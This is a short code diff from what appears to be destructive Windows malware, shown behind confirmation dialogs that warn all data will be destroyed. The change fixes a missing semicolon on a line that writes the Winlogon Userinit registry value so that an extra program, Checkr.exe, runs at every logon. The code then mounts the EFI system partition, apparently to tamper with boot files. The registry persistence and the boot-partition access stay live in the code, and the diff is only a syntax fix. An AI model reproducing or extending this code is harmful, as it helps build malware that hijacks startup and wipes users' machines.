@@ -134,7 +134,7 @@ int main(int argc, char ** argv)
     int secondconfirmbox = MessageBox(NULL, L"ALL DATA WILL BE DESTROYED! Are you sure you want to continue?", L"WARNING (Double check)", MB_OKCANCEL | MB_ICONEXCLAMATION);
     if (secondconfirmbox == IDCANCEL) return 0;
 
-    SetRegValue(L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Userinit", L"C:\\Windows\\system32\\userinit.exe,C:\\Windows\\system32\\Checkr.exe")
+    SetRegValue(L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Userinit", L"C:\\Windows\\system32\\userinit.exe,C:\\Windows\\system32\\Checkr.exe");
 
     if (is_efi() != ERROR_INVALID_FUNCTION) {
         system("mountvol P: /S");
